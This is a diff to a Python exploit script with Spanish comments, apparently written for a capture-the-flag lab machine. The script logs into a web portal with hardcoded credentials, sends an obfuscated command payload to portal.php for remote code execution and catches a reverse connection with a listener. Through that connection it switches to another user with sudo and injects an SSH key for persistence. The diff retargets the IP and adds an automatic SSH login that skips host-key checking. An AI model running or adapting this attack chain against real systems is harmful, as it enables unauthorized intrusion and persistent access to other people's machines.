@@ -12,7 +12,7 @@ import subprocess
 sesion = re.Session()
 
 # Defino las constantes del PoC de requests + session
-LOGIN_ENDPOINT = 'http://10.128.151.11/login.php'
+LOGIN_ENDPOINT = 'http://10.130.143.6/login.php'
 CREDENCIALES = {
     'username' : 'R1ckRul3s',
     'password' : 'Wubbalubbadubdub',
@@ -20,7 +20,7 @@ CREDENCIALES = {
 }
 
 # Defino el ednpoint donde se va a mandar el payload
-RCE_ENDPOINT = 'http://10.128.151.11/portal.php'
+RCE_ENDPOINT = 'http://10.130.143.6/portal.php'
 
 # Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
 IP_HOST = '192.168.132.194'
@@ -80,7 +80,7 @@ def listener(puerto):
     conexion.send(b"sudo su gacker\n") # Iniciamos sesion como usuario gacker
     conexion.send(b"whoami\n") # Verificamos que somos gacker
     print("\n" + "-" * 50)
-    print("Llave enviada, listo para ejecutar una conexion SSH: ssh -i llave_gacker gacker@10.128.151.11")
+    print(f"Llave inyectada en servidor, preparandose...")
     print("-" * 50 + "\n")
     time.sleep(1) # Despues del comando anadimos un sleep para asegurarnos de que lo procese
     # Ahora con .recv y decode almacenamos la respuesta del server y la imprimimos por pantalla
@@ -89,6 +89,7 @@ def listener(puerto):
     # Cerramos la conexion
     conexion.close()
     s.close()
+
 # Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
 estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)
 
@@ -114,6 +115,21 @@ if estado_login.status_code == 200:
         print(f"Payload ofuscado listo para enviar...")
         respuesta_payload = ejecutar_comando(payload_cmd)
         print(respuesta_payload)
+        
+        # --- NUEVA SECCIÓN DE AUTOSSH ---
+        print("\n[*] Esperando a que el listener configure la persistencia...")
+        hilo.join() # IMPORTANTE: Espera a que termine la conexion en segundo plano
+        
+        # Extraemos la IP de la víctima del LOGIN_ENDPOINT para automatizar
+        ip_victima = LOGIN_ENDPOINT.split('/')[2]
+        
+        print("[*] Ajustando permisos de la llave SSH...")
+        os.chmod(PATH_LLAVE, 0o600) # IMPORTANTE: SSH exige que la llave privada sea 600
+
+        print('[*] Conectando por SSH automaticamente...\n')
+        # Subprocess conecta tu terminal directamente al SSH
+        subprocess.run(["ssh", "-i", PATH_LLAVE, "-o", "StrictHostKeyChecking=no", f"gacker@{ip_victima}"])
+        
     else:
         print('Login fallido!')
 else:
